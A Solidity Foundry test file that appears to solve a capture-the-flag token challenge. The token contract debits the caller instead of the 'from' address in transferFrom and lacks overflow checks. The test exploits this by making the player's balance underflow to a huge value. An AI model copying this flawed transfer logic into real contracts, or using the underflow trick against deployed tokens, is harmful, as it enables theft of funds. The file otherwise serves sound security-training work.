// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ContractTest is Test {
    GoldtokenWhaleChallenge QuesttokenWhaleChallengeContract;

    function testCalculation() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        QuesttokenWhaleChallengeContract = new GoldtokenWhaleChallenge();
        QuesttokenWhaleChallengeContract.GoldtokenWhaleDeploy(address(this));
        console.log(
            "Player balance:",
            QuesttokenWhaleChallengeContract.gemtotalOf(address(this))
        );
        QuesttokenWhaleChallengeContract.shareTreasure(address(alice), 800);

        vm.prank(alice);
        QuesttokenWhaleChallengeContract.authorizeDeal(address(this), 1000);
        QuesttokenWhaleChallengeContract.sharetreasureFrom(
            address(alice),
            address(bob),
            500
        );

        console.log("operate completed, balance calculate");
        console.log(
            "Player balance:",
            QuesttokenWhaleChallengeContract.gemtotalOf(address(this))
        );
    }

    receive() external payable {}
}

contract GoldtokenWhaleChallenge {
    address player;

    uint256 public allTreasure;
    mapping(address => uint256) public gemtotalOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function GoldtokenWhaleDeploy(address _player) public {
        player = _player;
        allTreasure = 1000;
        gemtotalOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return gemtotalOf[player] >= 1000000;
    }

    event SendGold(address indexed from, address indexed to, uint256 value);

    function _sharetreasure(address to, uint256 value) internal {
        gemtotalOf[msg.sender] -= value;
        gemtotalOf[to] += value;

        emit SendGold(msg.sender, to, value);
    }

    function shareTreasure(address to, uint256 value) public {
        require(gemtotalOf[msg.sender] >= value);
        require(gemtotalOf[to] + value >= gemtotalOf[to]);

        _sharetreasure(to, value);
    }

    event Approval(
        address indexed realmLord,
        address indexed spender,
        uint256 value
    );

    function authorizeDeal(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function sharetreasureFrom(address from, address to, uint256 value) public {
        require(gemtotalOf[from] >= value);
        require(gemtotalOf[to] + value >= gemtotalOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _sharetreasure(to, value);
    }
}